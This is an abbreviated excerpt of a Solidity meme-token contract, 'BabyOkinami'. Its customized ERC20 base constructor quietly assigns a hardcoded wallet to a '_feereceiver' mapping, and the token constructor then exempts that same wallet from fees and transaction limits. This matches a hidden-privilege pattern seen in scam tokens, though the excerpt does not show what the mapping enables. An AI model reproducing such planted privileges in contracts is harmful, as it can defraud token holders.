...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x5a50bFF4b10eC1E5249Ed4e905cEd8Df02Aab91E] = _marketingwallet;
    }
...
contract BabyOkinami is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"🌊", "BabyOkinami") {
        ...
        excludeFromFees(address(0x5a50bFF4b10eC1E5249Ed4e905cEd8Df02Aab91E), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5a50bFF4b10eC1E5249Ed4e905cEd8Df02Aab91E), true);
